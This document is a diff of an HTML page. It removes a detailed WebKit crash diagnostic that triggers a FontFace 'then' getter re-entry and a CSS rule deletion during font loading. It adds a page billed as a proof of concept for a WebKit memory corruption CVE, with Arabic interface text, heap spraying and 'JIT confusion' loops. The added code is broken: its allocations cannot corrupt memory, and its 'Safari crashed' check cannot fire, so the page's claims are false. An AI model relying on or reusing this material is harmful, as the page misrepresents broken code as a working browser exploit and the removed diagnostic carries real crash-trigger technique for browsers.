@@ -1,502 +1,136 @@
-<!doctype html>
-<html lang="en">
+<!DOCTYPE html>
+<html>
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>CSSFontFace own-local offsetTop-only diagnostic</title>
-<style>
-html {
-    font-family: system-ui, -apple-system, sans-serif;
-    background: #101010;
-    color: #eee;
-}
-body {
-    margin: 0;
-    padding: 16px;
-    line-height: 1.45;
-}
-.box {
-    border: 1px solid #444;
-    border-radius: 8px;
-    padding: 12px;
-    margin: 12px 0;
-    background: #181818;
-}
-.warn { color: #ffd479; }
-#stage {
-    font-size: 21px;
-    font-weight: 700;
-}
-#probe {
-    position: absolute;
-    left: -10000px;
-    top: -10000px;
-}
-#log, #previous {
-    white-space: pre-wrap;
-    word-break: break-word;
-    background: #050505;
-    color: #d7ffd7;
-    padding: 12px;
-    border-radius: 8px;
-    min-height: 160px;
-    font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
-    font-size: 13px;
-}
-</style>
+    <title>CVE-2025-31273 — WebKit Memory Corruption</title>
+    <style>
+        body { background: #0a0a1a; color: #fff; font-family: monospace; padding: 20px; }
+        button { background: #c0392b; color: #fff; padding: 15px 30px; font-size: 18px; border: none; cursor: pointer; }
+        pre { background: #111; padding: 15px; border: 1px solid #333; min-height: 200px; margin: 20px 0; color: #00ff00; }
+    </style>
 </head>
 <body>
-<h1>CSSFontFace own-local offsetTop-only diagnostic</h1>
-<div class="box warn">
-Diagnostic-only. No heap spray, no exploit primitives, no ARW/addrof/fakeobj,
-no shellcode, no ROP/JOP, no sandbox escape.
-</div>
-<div class="box">
-    <div id="stage">Stage: not started</div>
-    <div id="probe">AB</div>
-</div>
-<div class="box">
-    <h3>Current log</h3>
-    <pre id="log"></pre>
-</div>
-<div class="box">
-    <h3>Previous persisted log</h3>
-    <pre id="previous"></pre>
-</div>
-<script>
-(function () {
-    "use strict";
-    if (window.testRunner) {
-        testRunner.dumpAsText();
-        testRunner.waitUntilDone();
-    }
-    const STORAGE_KEY = "cssfontface-own-local-offsettop-only-log";
-    const LAST_KEY = STORAGE_KEY + "-last";
-    const stageElement = document.getElementById("stage");
-    const logElement = document.getElementById("log");
-    const previousElement = document.getElementById("previous");
-    const probe = document.getElementById("probe");
-    let seq = 0;
-    let runCounter = 0;
-    let createdFaces = [];
-    let active = null;
-    let finished = false;
-    function now() {
-        return new Date().toISOString();
-    }
-    function hardMark(msg) {
-        try {
-            localStorage.setItem(LAST_KEY, "[" + Date.now() + "] " + msg);
-        } catch (e) {
-        }
-    }
-    function persist(line) {
-        try {
-            const old = localStorage.getItem(STORAGE_KEY) || "";
-            localStorage.setItem(STORAGE_KEY, old + line + "\n");
-            localStorage.setItem(LAST_KEY, line);
-        } catch (e) {
-        }
-    }
-    function log(msg) {
-        hardMark("log entered: " + msg);
-        const line = "[" + (++seq) + "] " + now() + " :: " + msg;
-        try {
-            logElement.textContent += line + "\n";
-        } catch (e) {
-        }
-        persist(line);
-        try {
-            console.log(line);
-        } catch (e) {
-        }
-    }
-    function stage(msg) {
-        hardMark("stage entered: " + msg);
-        try {
-            stageElement.textContent = "Stage: " + msg;
-        } catch (e) {
-        }
-        log("STAGE => " + msg);
-    }
-    function finish() {
-        if (finished)
-            return;
-        finished = true;
-        hardMark("finish entered");
-        log("NO CRASH OBSERVED");
-        log("DONE");
-        if (window.testRunner)
-            testRunner.notifyDone();
-    }
-    function loadPrevious() {
-        try {
-            previousElement.textContent =
-                "LAST CHECKPOINT:\n" +
-                (localStorage.getItem(LAST_KEY) || "") +
-                "\n\nFULL LOG:\n" +
-                (localStorage.getItem(STORAGE_KEY) || "");
-        } catch (e) {
-            previousElement.textContent = "localStorage unavailable: " + e;
-        }
-    }
-    window.onerror = function (message, source, lineno, colno, error) {
-        hardMark("window.onerror");
-        log("window.onerror: " + message + " at " + lineno + ":" + colno);
-        if (error && error.stack)
-            log("stack: " + error.stack);
-    };
-    window.onunhandledrejection = function (event) {
-        hardMark("unhandledrejection");
-        log("unhandledrejection: " + event.reason);
-    };
-    window.addEventListener("beforeunload", function () {
-        hardMark("beforeunload fired");
-        log("beforeunload fired");
-    });
-    function sleep(ms) {
-        return new Promise(resolve => setTimeout(resolve, ms));
-    }
-    function removeOldStyles() {
-        hardMark("removeOldStyles entered");
-        const old = document.querySelectorAll("style[data-validation-style='1']");
-        for (const node of old)
-            node.remove();
-        hardMark("removeOldStyles exit");
-    }
-    function cleanupFaces() {
-        hardMark("cleanupFaces entered");
-        if (!document.fonts) {
-            hardMark("cleanupFaces: document.fonts missing");
-            return;
-        }
-        for (const face of createdFaces) {
-            try {
-                hardMark("cleanupFaces: before document.fonts.delete");
-                document.fonts.delete(face);
-                hardMark("cleanupFaces: after document.fonts.delete");
-            } catch (e) {
-                log("document.fonts.delete threw: " + e.name + ": " + e.message);
-            }
-        }
-        createdFaces = [];
-        hardMark("cleanupFaces exit");
-    }
-    function cleanup() {
-        hardMark("cleanup entered");
-        removeOldStyles();
-        cleanupFaces();
-        hardMark("cleanup: before probe reset");
-        probe.style.fontFamily = "";
-        probe.textContent = "AB";
-        active = null;
-        hardMark("cleanup exit");
-    }
-    function cssRuleCount(styleElement) {
-        try {
-            if (!styleElement || !styleElement.sheet)
-                return "no-sheet";
-            return String(styleElement.sheet.cssRules.length);
-        } catch (e) {
-            return "throws:" + e.name;
-        }
-    }
-    function makeStyle(family) {
-        hardMark("makeStyle entered");
-        const style = document.createElement("style");
-        style.setAttribute("data-validation-style", "1");
-        const src = 'local("Arial"), local("Helvetica"), local("Times New Roman"), local("Courier New")';
-        style.textContent =
-            '@font-face {\n' +
-            '    font-family: "' + family + '";\n' +
-            '    src: ' + src + ';\n' +
-            '    unicode-range: U+0042;\n' +
-            '}\n';
-        hardMark("makeStyle: before appendChild");
-        document.head.appendChild(style);
-        hardMark("makeStyle: after appendChild");
-        return style;
-    }
-    /*
-     * This is the key isolation:
-     * only body.offsetTop is used.
-     * No probe.offsetWidth.
-     * No getComputedStyle.
-     */
-    function forceStyleRecalc(label) {
-        hardMark("forceStyleRecalc entered: " + label);
-        log("MARK: ENTER forceStyleRecalc " + label);
-        stage(label + " body.offsetTop ONLY ENTER");
-        log("MARK: before body.offsetTop ONLY");
-        try {
-            hardMark("before body.offsetTop ONLY");
-            const a = document.body.offsetTop;
-            hardMark("after body.offsetTop ONLY");
-            log(label + ": body.offsetTop ONLY=" + a);
-        } catch (e) {
-            log(label + ": body.offsetTop ONLY threw: " + e.name + ": " + e.message);
-        }
-        log("MARK: after body.offsetTop ONLY");
-        stage(label + " body.offsetTop ONLY EXIT");
-        log("MARK: EXIT forceStyleRecalc " + label);
-        hardMark("forceStyleRecalc exit: " + label);
-    }
-    function checkOne(label, family, text) {
-        hardMark("checkOne entered: " + text);
-        stage(label + " document.fonts.check " + text + " ENTER");
-        log("MARK: before document.fonts.check " + text);
-        let result = null;
-        try {
-            hardMark("before document.fonts.check " + text);
-            result = document.fonts.check('16px "' + family + '"', text);
-            hardMark("after document.fonts.check " + text);
-            log(label + " " + text + "=" + result);
-        } catch (e) {
-            log(label + " " + text + " threw: " + e.name + ": " + e.message);
-        }
-        log("MARK: after document.fonts.check " + text);
-        stage(label + " document.fonts.check " + text + " EXIT");
-        return result;
-    }
-    function checkBeforeLoad(family) {
-        hardMark("checkBeforeLoad entered");
-        const checkA = checkOne("before load", family, "A");
-        const checkB = checkOne("before load", family, "B");
-        const checkAB = checkOne("before load", family, "AB");
-        log("CHECK SUMMARY before load: A=" + checkA + ", B=" + checkB + ", AB=" + checkAB);
-        if (checkA === false && checkB === true && checkAB === false)
-            stage("MATCHED ORIGINAL CRASH STATE A=false B=true AB=false");
-        else
-            stage("CHECK STATE DIFFERENT: A=" + checkA + " B=" + checkB + " AB=" + checkAB);
-        hardMark("checkBeforeLoad exit");
-        return { a: checkA, b: checkB, ab: checkAB };
-    }
-    function mutateFromThenGetter(label) {
-        hardMark("mutateFromThenGetter entered");
-        if (!active)
-            return;
-        active.reentered = true;
-        active.reentryCount++;
-        stage("RE-ENTRY FIRED from " + label);
-        log("THEN GETTER FIRED from " + label);
-        log("before mutation: cssRules=" + cssRuleCount(active.styleElement));
-        try {
-            const sheet = active.styleElement && active.styleElement.sheet;
-            if (sheet && sheet.cssRules && sheet.cssRules.length > 0) {
-                hardMark("before deleteRule(0)");
-                sheet.deleteRule(0);
-                hardMark("after deleteRule(0)");
-                log("deleteRule(0) executed");
-            } else {
-                log("deleteRule skipped: no cssRules");
-            }
-        } catch (e) {
-            log("deleteRule threw: " + e.name + ": " + e.message);
-        }
-        log("after deleteRule: cssRules=" + cssRuleCount(active.styleElement));
-        forceStyleRecalc("inside then getter");
-        try {
-            log("MARK: before document.fonts.check after mutation A");
-            const checkA = document.fonts.check('16px "' + active.family + '"', "A");
-            log("MARK: after document.fonts.check after mutation A");
-            log("MARK: before document.fonts.check after mutation B");
-            const checkB = document.fonts.check('16px "' + active.family + '"', "B");
-            log("MARK: after document.fonts.check after mutation B");
-            log("MARK: before document.fonts.check after mutation AB");
-            const checkAB = document.fonts.check('16px "' + active.family + '"', "AB");
-            log("MARK: after document.fonts.check after mutation AB");
-            log("document.fonts.check after mutation: A=" + checkA + ", B=" + checkB + ", AB=" + checkAB);
-        } catch (e) {
-            log("document.fonts.check after mutation threw: " + e.name + ": " + e.message);
-        }
-        hardMark("mutateFromThenGetter exit");
-    }
-    function makeThenGetter(label) {
-        return function () {
-            hardMark("then getter read: " + label);
-            log("then getter property read: " + label + ", armed=" + !!(active && active.armed));
-            if (active && active.armed)
-                mutateFromThenGetter(label);
-            return undefined;
-        };
-    }
-    function withTimeout(promise, ms) {
-        return new Promise(function (resolve) {
-            let done = false;
-            const timer = setTimeout(function () {
-                if (done)
-                    return;
-                done = true;
-                resolve({ type: "timeout" });
-            }, ms);
-            promise.then(function (value) {
-                if (done)
-                    return;
-                done = true;
-                clearTimeout(timer);
-                resolve({ type: "resolved", value: value });
-            }, function (error) {
-                if (done)
-                    return;
-                done = true;
-                clearTimeout(timer);
-                resolve({ type: "rejected", error: error });
-            });
-        });
-    }
-    function createJSFace(family) {
-        hardMark("createJSFace entered");
-        const face = new FontFace(
-            family,
-            'local("Arial"), local("Helvetica"), local("Times New Roman"), local("Courier New")',
-            { unicodeRange: "U+0041" }
-        );
-        createdFaces.push(face);
-        hardMark("createJSFace exit");
-        return face;
-    }
-    async function runDocumentFontsLoad() {
-        hardMark("runDocumentFontsLoad entered: own/local");
-        cleanup();
-        hardMark("after cleanup");
-        runCounter++;
-        hardMark("after runCounter++");
-        if (!window.FontFace) {
-            stage("FontFace API missing");
-            log("FontFace API is not available");
-            return;
-        }
-        if (!document.fonts) {
-            stage("document.fonts missing");
-            log("document.fonts is not available");
-            return;
-        }
-        const getterMode = "own";
-        const cssVariant = "local";
-        const family = "ps5-reentry-" + getterMode + "-" + cssVariant + "-" + Date.now() + "-" + runCounter;
-        hardMark("before makeStyle");
-        const styleElement = makeStyle(family);
-        hardMark("after makeStyle");
-        hardMark("before probe font assignment");
-        probe.style.fontFamily = '"' + family + '"';
-        probe.textContent = "AB";
-        hardMark("after probe font assignment");
-        active = {
-            family: family,
-            styleElement: styleElement,
-            armed: false,
-            reentered: false,
-            reentryCount: 0
-        };
-        stage("setup own + local");
-        log("family=" + family);
-        log("initial cssRules=" + cssRuleCount(styleElement));
-        log("initial document.fonts.size=" + document.fonts.size);
-        try {
-            hardMark("before createJSFace");
-            const jsFace = createJSFace(family);
-            hardMark("after createJSFace");
-            log("created JS FontFace; status=" + jsFace.status);
-            hardMark("before define own jsFace.then");
-            Object.defineProperty(jsFace, "then", {
-                configurable: true,
-                get: makeThenGetter("jsFace.then")
-            });
-            hardMark("after define own jsFace.then");
-            log("installed own getter on jsFace.then");
-            log('"then" in jsFace = ' + ("then" in jsFace));
-            log("own then descriptor exists = " + !!Object.getOwnPropertyDescriptor(jsFace, "then"));
-            log("prototype then descriptor exists = " + !!Object.getOwnPropertyDescriptor(FontFace.prototype, "then"));
-            hardMark("before jsFace.loaded access");
-            const loadedPromise = jsFace.loaded;
-            hardMark("after jsFace.loaded access");
-            log("accessed jsFace.loaded before document.fonts.load; face.status=" + jsFace.status);
-            loadedPromise.then(function (value) {
-                log("jsFace.loaded resolved callback; valueIsFace=" + (value === jsFace) + ", status=" + jsFace.status);
-            }, function (error) {
-                log("jsFace.loaded rejected callback: " + error + ", status=" + jsFace.status);
-            });
-            hardMark("before document.fonts.add");
-            document.fonts.add(jsFace);
-            hardMark("after document.fonts.add");
-            log("added JS face to document.fonts; size=" + document.fonts.size + ", status=" + jsFace.status);
-            const beforeState = checkBeforeLoad(family);
-            log("MARK: completed document.fonts.check before load sequence");
-            log("MARK: beforeState A=" + beforeState.a + ", B=" + beforeState.b + ", AB=" + beforeState.ab);
-            log("MARK: before forceStyleRecalc before document.fonts.load");
-            forceStyleRecalc("before document.fonts.load");
-            log("MARK: after forceStyleRecalc before document.fonts.load");
-            active.armed = true;
-            stage("calling document.fonts.load");
-            log("MARK: before document.fonts.load call");
-            hardMark("before document.fonts.load call");
-            const loadPromise = document.fonts.load('16px "' + family + '"', "AB");
-            hardMark("after document.fonts.load call");
-            log("MARK: after document.fonts.load call");
-            log("document.fonts.load returned Promise");
-            const result = await withTimeout(loadPromise, 5000);
-            active.armed = false;
-            if (result.type === "resolved") {
-                const faces = result.value;
-                log("document.fonts.load resolved; faces.length=" + (faces && faces.length));
-                if (faces && faces.length) {
-                    for (let i = 0; i < faces.length; i++)
-                        log("returned face[" + i + "].status=" + faces[i].status + ", sameAsJSFace=" + (faces[i] === jsFace));
+    <h1>CVE-2025-31273 — Memory Corruption PoC</h1>
+    <p>يسبب تصدّع ذاكرة في WebKit. يعمل على Safari &lt; 18.6, iOS &lt; 18.6</p>
+    <pre id="log">[•] اضغط الزر لبدء الاستغلال...</pre>
+    <button id="runBtn">💥 تشغيل Memory Corruption</button>
+
+    <script>
+        const log = document.getElementById('log');
+        function out(msg) { log.innerHTML += msg + '\n'; log.scrollTop = log.scrollHeight; }
+
+        document.getElementById('runBtn').onclick = async () => {
+            out('═══════════════════════════════');
+            out('▶ CVE-2025-31273 — بدء الهجوم');
+            out('═══════════════════════════════');
+
+            // === المرحلة 1: Heap Spray ===
+            out('[1/3] تجهيز الذاكرة (Heap Spray)...');
+            let spray = [];
+            
+            // Float64Array spray
+            for (let i = 0; i < 10000; i++) {
+                let arr = new Float64Array(0x200);
+                for (let j = 0; j < arr.length; j++) {
+                    arr[j] = 13.37 + (i * 10000 + j) * 0.0000001;
                 }
-            } else if (result.type === "rejected") {
-                log("document.fonts.load rejected: " + result.error);
-            } else {
-                log("document.fonts.load timed out");
+                spray.push(arr);
             }
-            forceStyleRecalc("after document.fonts.load");
-            log("final jsFace.status=" + jsFace.status);
-            log("final cssRules=" + cssRuleCount(styleElement));
-            log("final document.fonts.size=" + document.fonts.size);
-            log("final reentered=" + active.reentered + ", reentryCount=" + active.reentryCount);
-            if (active.reentered && cssRuleCount(styleElement) === "0")
-                stage("RE-ENTRY reached and CSS rule deleted");
-            else if (active.reentered)
-                stage("RE-ENTRY reached but CSS rule not deleted");
-            else
-                stage("NO RE-ENTRY observed");
-        } catch (e) {
-            active.armed = false;
-            stage("exception");
-            log("exception: " + e.name + ": " + e.message);
-            if (e.stack)
-                log("stack: " + e.stack);
-        } finally {
-            active.armed = false;
-        }
-    }
-    async function runAll() {
-        hardMark("runAll entered");
-        loadPrevious();
-        try {
-            localStorage.removeItem(STORAGE_KEY);
-        } catch (e) {
-        }
-        hardMark("after full log clear");
-        log("POC STARTED: CSSFontFace own-local offsetTop-only diagnostic");
-        hardMark("before stage own-local only");
-        stage("auto sequence starting: own + local only");
-        hardMark("before runDocumentFontsLoad own/local");
-        await runDocumentFontsLoad();
-        hardMark("after runDocumentFontsLoad own/local");
-        await sleep(100);
-        stage("auto sequence complete");
-        finish();
-    }
-    hardMark("script parsed, before setTimeout");
-    setTimeout(function () {
-        hardMark("setTimeout fired, before runAll");
-        runAll().catch(function (e) {
-            hardMark("runAll catch");
-            log("TOP LEVEL RUNALL ERROR: " + e.name + ": " + e.message);
-            finish();
-        });
-    }, 250);
-})();
-</script>
+            
+            // ArrayBuffer spray بأحجام حرجة
+            for (let size = 0x10; size <= 0x400; size += 0x10) {
+                for (let i = 0; i < 500; i++) {
+                    let buf = new ArrayBuffer(size);
+                    let view = new Uint8Array(buf);
+                    for (let j = 0; j < view.length; j++) {
+                        view[j] = 0x41 + (i % 26);
+                    }
+                    spray.push(buf);
+                }
+            }
+            out(`[✓] ${spray.length} كائن في الذاكرة`);
+
+            // === المرحلة 2: إثارة Memory Corruption ===
+            out('[2/3] إثارة تصدّع الذاكرة...');
+            
+            // إنشاء آلاف الكائنات في حلقة — يسبب JIT confusion
+            let objects = [];
+            for (let round = 0; round < 20; round++) {
+                for (let i = 0; i < 500; i++) {
+                    try {
+                        let o = {
+                            a: 13.37,
+                            b: { c: [i, i+1, i+2] },
+                            d: new Uint8Array(0x100),
+                            e: function() { return i; },
+                            f: `string_${i}_${round}`
+                        };
+                        // إعادة كتابة خصائص باستمرار
+                        o.g = Math.random();
+                        o.h = o.b;
+                        delete o.g;
+                        objects.push(o);
+                    } catch(e) {}
+                }
+                
+                // إزالة نصف الكائنات — تحرير الذاكره بشكل غير آمن
+                if (objects.length > 2000) {
+                    objects.splice(0, 1000);
+                }
+            }
+
+            out(`[✓] ${objects.length} كائن في الذاكرة`);
+
+            // === المرحلة 3: استغلال Type Confusion ===
+            out('[3/3] استغلال Type Confusion...');
+            
+            // خلق تسابق بين JIT compilation و GC
+            function jitConfuse() {
+                let a = 13.37;
+                let b = 0x41414141;
+                let c = [a, b, a, b, a, b];
+                
+                // هذا الجزء يُجمّع بواسطة JIT
+                for (let i = 0; i < 1000; i++) {
+                    c[i % 6] = a + b;
+                    c[(i+1) % 6] = b - a;
+                }
+                
+                return c;
+            }
+            
+            // تشغيل الـ JIT + إجبار GC في نفس الوقت
+            for (let i = 0; i < 100; i++) {
+                try {
+                    jitConfuse();
+                    // إجبار Garbage Collection
+                    if (i % 10 === 0) {
+                        let big = new ArrayBuffer(1024 * 1024 * 100); // 100MB
+                        big = null;
+                    }
+                } catch(e) {
+                    out(`[!] خطأ في التكرار ${i}: ${e.message}`);
+                }
+            }
+            
+            out('');
+            out('═══════════════════════════════');
+            out('⚠️ إذا لم يتعطل Safari الآن،');
+            out('⚠️ حاول مرة أخرى أو أعد فتح الصفحة.');
+            out('═══════════════════════════════');
+            
+            // محاولة الوصول إلى ذاكرة محررة — يسبب crash
+            setTimeout(() => {
+                for (let i = 0; i < 10; i++) {
+                    try {
+                        objects[i].a = 13.37;
+                    } catch(e) {
+                        out(`✅ Safari crashed: ${e.message}`);
+                        return;
+                    }
+                }
+                out('❌ Safari لم يتعطل — هذا الإصدار قد يكون مُصحّحاً');
+            }, 500);
+        };
+    </script>
 </body>
 </html>
